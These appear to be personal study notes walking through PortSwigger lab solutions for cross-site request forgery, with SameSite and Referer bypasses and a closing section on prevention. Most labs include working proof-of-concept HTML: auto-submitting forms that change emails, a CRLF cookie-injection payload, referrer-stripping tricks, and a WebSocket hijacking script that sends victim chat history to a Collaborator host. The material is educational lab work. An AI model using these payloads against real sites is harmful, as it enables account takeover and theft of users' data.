Cross-Site Request Forgery (CSRF)
**Overview**
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to force a user to perform actions that they do not intend to perform.

**Impact**:
In a successful CSRF attack, the attacker causes the victim to carry out an action unintentionally, such as:


**Account Takeover**: Changing the email address or password on their account.

**Financial Loss**: Performing unauthorized funds transfers.

**Full System Compromise**: If the victim has a privileged role (Admin), the attacker can take full control of the application's data and functionality.

lets start solving portswigger labs:

first lab:

1)there’s no csrf protection just create POC  script to change the mail and send it to the victim 
second lab:
2)bypass by switching the request to get method and create the POC

if you change the method of the request it doesn't validate if csrf exists or not

third lab:

3)bypass by removing the parameter of the csrf token (you can just remove the value and test too, maybe add trash value) 
only validate the token if it exists

fourth lab:

4)sometimes it validates the token but doesn't make sure it's for the same user using the request (just make the poc and test it on the victim account)
and to test it in real world try to change the mail/password using another account csrf token

fifth lab:

5)in this one you have (session, csrfKey, csrfToken) assume you have account A and account B
first try sessionA with csrfToken B with csrfKey A it doesnt work so it means they might be tied together with the session or just tied together without the session (which is the vulnerability) and if it accepts it's a vulnerability, then try sessionA with csrfToken B with csrfKey B (and this is called http header injection) if it accepts then it's a vulnerability cuz they are tied together but not tied to the session too, EXPLOIT: first take account B csrftoken and csrfkey then make the POC server 

> ```html
> <html>
> > <body>
> <form action="[https://0a22007b0499065985e2688f00a700b5.web-security-academy.net/my-account/change-email](https://0a22007b0499065985e2688f00a700b5.web-security-academy.net/my-account/change-email)" method="POST">
> <input type="hidden" name="email" value="test2@gmail.com" />
> <input type="hidden" name="csrf" value="th6OTeFx7NdSka07PiEUD6Es1ECPfCSJ" />
> <input type="submit" value="Submit request" />
> </form>
> <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None)" onerror="document.forms[0].submit();"/>
> </body>
> </html>
> ```

after making sure that the search request accepts the http header injection by adding this to the request `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY`

so your setting ur cstfKey to the victim account first and then you link it with ur csrf token to change the vitim email by using valid and tied csrftoken and csrfkey

lab number 6:

6)this time we have csrf token in the header and csrf token, they both have same value and gets accepted by comparing between both of them if = then pass it 
so you need to inject a valid csrf header that you know and then send the request with the same csrf token you also know, exploit:
> ```html
><html>
><!-- CSRF PoC - generated by Burp Suite Professional -->
><body>
><form action="https://0a22007b0499065985e2688f00a700b5.web-security-academy.net/my-account/change-email" method="POST">
><input type="hidden" name="email" [value="test2@gmail.com](mailto:value=%22test2@gmail.com)" />
><input type="hidden" name="csrf" value="th6OTeFx7NdSka07PiEUD6Es1ECPfCSJ" />
><input type="submit" value="Submit request" />
></form>
><img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
></body>
></html>
after making sure that the search request accepts the http header injection by adding this to the request `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY`

……………………….**Bypassing SameSite cookie restrictions……………………………**

explain: how to know that request sent from samesite and same origin

       scheme|   +1     |  TLD

tld+1 :.https://example.com
this called a site

when to call it Origin? → when you add port number to it → https://example.com:443

Same-Site: if it has same scheme (http/https) same +1 and same TLD or (ETLD → (.co.uk)
Same-Origin:if it has same scheme (http/https) same +1 and same TLD or (ETLD → (.co.uk) and same port

example:

| **Request from** | **Request to** | **Same-site?** | **Same-origin?** |
| --- | --- | --- | --- |
| `https://example.com` | `https://example.com` | Yes | Yes |
| `https://app.example.com` | `https://intranet.example.com` | Yes | No: mismatched domain name |
| `https://example.com` | `https://example.com:8080` | Yes | No: mismatched port |
| `https://example.com` | `https://example.co.uk` | No: mismatched eTLD | No: mismatched domain name |
| `https://example.com` | `http://example.com` | No: mismatched scheme | No: mismatched scheme |

This is an important distinction as it means that any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site. We'll see an example of this in one of the labs later. (if one subdomain is vulnerable you can use it against other subdomains too → because they are under SameSite and same TLD+1)

**SameSite types:-**

**Strict: only send the cookie is the request from the same site  (High protection low usability)**

**Lax:cookie gets sent only during GET requests can't be sent during POST requests  (if developer didn't set samsite restrictions chrome sets it automatically)**

**None: cookie always gets sent doesn't matter the method or the domain asks for it

 SameSite Cookie Behavior in a scenario:**

Let’s say a user is browsing a website, and there’s a button that redirects them to another website.

When that happens, the browser might try to send the cookie to log the user in automatically.

Now, whether the cookie gets sent or not depends on the `SameSite` attribute:

**Strict:**

The cookie is **only sent** if the request comes from the **same site**.

 Cross-site requests will **not include the cookie** at all.

 High protection, but can break user experience.

**Lax:**

The cookie is sent **only** for:

**Top-level navigation** (like clicking a link)

 It **won’t** be sent with **POST requests** or background requests.

 Default in Chrome if not specified.

**None:**

The cookie is **always sent**, even with **cross-site requests**, regardless of the method.

Must be used with `Secure` (HTTPS only).

labs:
7)on the response of the login request you can see that there's no SameSite restrictions example: 
`HTTP/1.1 200 OK
Set-Cookie: session=Bmjt093nmbx86ZVi3OtRYub92nD7y275; SameSite=Strict; HttpOnly; Secure`

means chrome will put lax by default (only GET requests can take cookies)

how to bypass: (some frameworks can be tricked to accept post requests through GET requests ex Symfony)
get the change email request change it's method to GET hit send (doesn't accept GET request for this functionality) then add _method=POST to the request to change it one more time after it gets sent, should look like this
`GET /my-account/change-email?email=get%40gmail.&_method=POST HTTP/2` 
then create the POC:

```jsx
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form action="https://0a6c0031034cb64680092b2200f400f5.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="get@gmail." />
<input type="hidden" name="_method" value="POST" /> // heres hidden command change method
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

8)after checking the response of the login request it's a strict samesite

it won't let you take the cookies by any request method only if it's from the same site 
after navigation it has a dom redirect vulnerability, now you can use the website to make a request to give you the cookies (make in mind that change password functionality accepts GET method which is a vulnerability too) 
so the goal is to ask the website to give you the cookie then use it to change password (all can happen through url you can simply make the victim click this link and it will work `https://0afc00e404a8fce2e88a612600e800d7.web-security-academy.net/my-account/change-email?email=csrf%40gmail.com&submit=1`

exploit: 

```jsx
<html>
<body>
<script>
document.location = "https://0afc00e404a8fce2e88a612600e800d7.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=csrf1%40gmail.com%26submit=1";
</script>
</body>
</html>
```

a simple javescript makes the user gets redirect to the link that makes him change his own email

9)first you need to know some stuff:
**WebSocket** is a way to create a **constant two-way connection** between the browser and the server. It lets them **send data back and forth instantly** without needing to make new requests every time — making apps **faster and more real-time**. used in live chats for example

so in this lab first you will try the websocket template to get the history chat of user 

```jsx
<script>
var ws = new WebSocket('wss://example.com/chat');
ws.onopen = function() {
ws.send("READY");
};
ws.onmessage = function(event) {
fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: event.data
});
};
</script>
```

but because the samesite restriction is strict so you won't be albe to see the history because your making a request from your fake website (collaborator) to see the chat history, so you need to link it up with another vuln that allows you to send the request from the website to see the history chat so that it passes, after some search you found a useless subdomain that has a classic xss vlun on its log in page but it's cocidered as a sibling domain to you chat page (https://cms-0a4400bb04cd119380f4766b008f00dc.web-security-academy.net/login)

so you will inject the websocket template in the username of that page and url encode it after changing the method to get method so that you can send that request in a link then copy that request url and put it in simple script that redirects the victim to make the websocket request for you

<script>
document.location = "https://cms-0a4400bb04cd119380f4766b008f00dc.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>

send to victim, pull now on Collaborator and Analyze the chat history of the victim

10) so in this lab after analysis you found 
It doesn't set a SameSite attribute, so the browser defaults to `SameSite=Lax` behavior
 (no post requests get sent from outside) but you realize there's login with your social media functionality and  and there's no csrf protection on the change email functionality cuz it depends on the LAX that it won't accept any post requests from outside so no csrf attack will pass 

but in the login with social media functionality Chrome allows the post requests to happen in the first 2 mins of the login so that it allows the request that happens from the social media platform with credentials of the user (so it means the csrf can happen only in the window time of the login with social media  but we need to make it work even after those 2 mins so the solution is to make a script makes the user log in with social media first then make the change email method 
```jsx
`<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form method="POST" action="https://0a350099034ed67380b003a0007c00e9.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="pwned2@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
window.onclick = () => {
window.open('https://0a350099034ed67380b003a0007c00e9.web-security-academy.net/social-login');
setTimeout(changeEmail, 5000);
}`

`function changeEmail() {
    document.forms[0].submit();
}`

`</script>
</body>
</html>`
```
and since pop up new window gets blocked by chrome you have to add `window.onclick` and trick the victim into clicking the screen so that it works soomthly

**11) Lab: CSRF where Referer validation depends on header being present**

so this lab only depends on referer header to make sure that you can from the same site 

difference between referer header and samesite restriction:

samesite restriction defense: happens from the browser it's not applicaple in the backend code
referer header defense: this happens from the server itself it's checked by the backend code to see if the request came from same site domain or not and can be bypassed by many ways the remove the referer header from the request or replace it with a fake referer header by adding some line in the POC examples:
`<meta name="referrer" content="never">` this forbids the browser to see the refere header in any request on this page

another example:
```jsx
`<form action="https://victim.com/change-email" method="POST" target="_blank" rel="noreferrer">
<input type="hidden" name="email" value="attacker@evil.com">
<input type="submit" value="Submit">
</form>`
```
this forbids the browser to see the refere header in any request on this request 

exploit:

```jsx
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form action="https://0a8d004c04287007801e085b00b4009b.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="test@gmail.com" />
<input type="submit" value="Submit request" />
<meta name="referrer" content="never">
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

how to check if it bypass Referrer header if it's not available → remove the referrer header from the request and hit send 

POST /my-account/change-email HTTP/2
Host: [0a60005903c1c8be80c6852f0037002e.web-security-academy.net](http://0a60005903c1c8be80c6852f0037002e.web-security-academy.net/)
Cookie: session=hxbEQKL9ELxPX1wVa1MZ63B1jxyBcmAF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: [https://0a60005903c1c8be80c6852f0037002e.web-security-academy.net](https://0a60005903c1c8be80c6852f0037002e.web-security-academy.net/)
`Referer: https://hacked/?0a60005903c1c8be80c6852f0037002e.web-security-academy.net/my-account?id=wiener`  (remove the header)
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=test%[40gmail.com](http://40gmail.com/)

 

12) **Lab: CSRF with broken Referer validation**in

 this one it doesn't allow you to send the request without the referrer header but it accepts the request if it has the domain name in it's referrer header for example if the referrer header is like :

`Referer: https://0a60005903c1c8be80c6852f0037002e.web-security-academy.net/my-account?id=wiener`

if you send it like this it will accept too:

`Referer: https://hacked-domain.com/?0a60005903c1c8be80c6852f0037002e.web-security-academy.net/my-account?id=wiener` 

so in order to exploit we need to use the history.pushState function in the POC or the malicious page that adds the domain name to the actual referrer header we have.

<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form action="https://0a1800da04c2c6c0807e0daa001f00a6.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="te1st@gmail.com" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/?0a1800da04c2c6c0807e0daa001f00a6.web-security-academy.net ');

document.forms[0].submit();
</script>
</body>
</html>

and

because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

```
Referrer-Policy: unsafe-url
```

How to Prevent CSRF Vulnerabilities:

### 1. Use CSRF Tokens

- **Best protection** against CSRF attacks.
- Token must be:
    - **Unpredictable** (high entropy).
    - **Tied to the user session**.
    - **Strictly validated** before executing any sensitive action.

### 2. How to Generate CSRF Tokens

- Use a **cryptographically secure PRNG (CSPRNG)**.
- Seed with **timestamp + static secret**.
- For stronger security:
    - Add **user-specific data**, then hash the result.

### 3. How to Transmit CSRF Tokens

- **Preferred**: Include in a **hidden HTML `<input>` field** inside a POST form:
    
    ```html
    html
    CopyEdit
    <input type="hidden" name="csrf-token" value="random_token">
    
    ```
    
- Place the token field **early in the HTML** to avoid malicious manipulation.

### Avoid:

- **URL query strings** (because of logging, referer leakage, display).
- **Cookies** (sent automatically; vulnerable).

### Alternative:

- **Custom HTTP header** (via JavaScript). More secure, but only works with AJAX/XHR.

### 4. How to Validate CSRF Tokens

- Store token **server-side** in the user's session.
- On request:
    - Verify token **matches** session value.
    - Validate on **every request**, regardless of method/content type.
    - **Reject if token missing or invalid**.

### 5. Use `SameSite` Cookie Restrictions

- Set `SameSite` attribute for all cookies:
    - Use `*Strict**` by default.
    - Downgrade to `Lax` only if needed.
    - Avoid `SameSite=None` unless you understand the **risks**.

### 6. Watch for Cross-Origin, Same-Site Attacks

- `SameSite` helps against **cross-site** CSRF.
- But **same-site subdomains** can still attack each other.
- Solution: **Isolate user-uploaded/insecure content** on separate domains.
